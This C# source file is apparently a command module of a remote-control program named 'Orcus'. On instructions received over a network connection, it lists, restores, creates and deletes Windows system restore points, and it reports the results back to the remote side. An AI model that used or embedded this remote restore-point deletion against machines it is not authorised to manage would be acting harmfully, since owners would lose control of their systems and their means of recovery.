using System;
using System.Collections.Generic;
using System.Text;
using Orcus.Plugins;
using Orcus.Shared.Commands.SystemRestore;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.SystemRestore
{
    public class SystemRestoreCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((SystemRestoreCommunication) parameter[0])
            {
                case SystemRestoreCommunication.GetRestorePoints:
                    try
                    {
                        var systemRestorePoints = SystemRestoreUtilities.GetSystemRestorePoints();
                        foreach (var systemRestorePoint in systemRestorePoints)
                            systemRestorePoint.CreationDate = systemRestorePoint.CreationDate.ToUniversalTime();

                        ResponseBytes((byte) SystemRestoreCommunication.ResponseRestorePoints,
                            new Serializer(typeof (List<SystemRestorePointInfo>)).Serialize(systemRestorePoints),
                            connectionInfo);
                    }
                    catch (Exception)
                    {
                        ResponseByte((byte) SystemRestoreCommunication.ResponseNoAccess, connectionInfo);
                    }
                    break;
                case SystemRestoreCommunication.RestorePoint:
                    var sequenceNumber = BitConverter.ToUInt32(parameter, 1);
                    ResponseByte((byte) SystemRestoreCommunication.ResponseBeginRestore, connectionInfo);
                    var result = SystemRestoreUtilities.Restore(sequenceNumber);
                    ResponseByte(
                        (byte)
                            (result
                                ? SystemRestoreCommunication.ResponseRestoreSucceed
                                : SystemRestoreCommunication.ResponseRestoreFailed), connectionInfo);
                    break;
                case SystemRestoreCommunication.RemoveRestorePoint:
                    sequenceNumber = BitConverter.ToUInt32(parameter, 1);
                    result = SystemRestoreUtilities.RemoveRestorePoint(sequenceNumber);
                    ResponseByte(
                        (byte)
                            (result
                                ? SystemRestoreCommunication.ResponseRemoveSucceed
                                : SystemRestoreCommunication.ResponseRemoveFailed), connectionInfo);
                    break;
                case SystemRestoreCommunication.CreateRestorePoint:
                    var restoreType = (RestoreType) parameter[1];
                    var eventType = (EventType) parameter[2];
                    var description = Encoding.UTF8.GetString(parameter, 3, parameter.Length - 3);
                    ResponseByte((byte)SystemRestoreCommunication.ResponseCreatingRestorePoint, connectionInfo);
                    result = SystemRestoreUtilities.CreateRestorePoint(description, restoreType, eventType);
                    ResponseByte(
                        (byte)
                            (result
                                ? SystemRestoreCommunication.ResponseCreateRestorePointSucceed
                                : SystemRestoreCommunication.ResponseCreateRestorePointFailed), connectionInfo);
                    break;
            }
        }

        protected override uint GetId()
        {
            return 28;
        }
    }
}